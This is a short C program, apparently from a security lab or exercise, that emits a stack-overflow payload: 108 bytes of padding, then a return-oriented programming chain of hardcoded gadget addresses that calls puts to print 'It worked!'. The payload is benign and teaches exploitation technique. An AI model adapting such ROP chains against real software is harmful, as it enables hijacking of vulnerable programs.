#include <stdio.h>

int main(void) {
    int return_address_offset = 108;
    // padding up to return address
    for (int i = 0; i < return_address_offset; ++i) {
        putchar('_');
    }
    unsigned long stack_values[] = {
        0x2aaaaad06544, // popq %rax; ret
        0x2aaaaad42690, // address of puts
        0x2aaaaadfdc95, // mov %rsp, %rdi; call *%rax
    };
    fwrite(stack_values, 1, sizeof stack_values, stdout);
    fputs("It worked!", stdout);
    putchar('\0');
    putchar('\n');
}

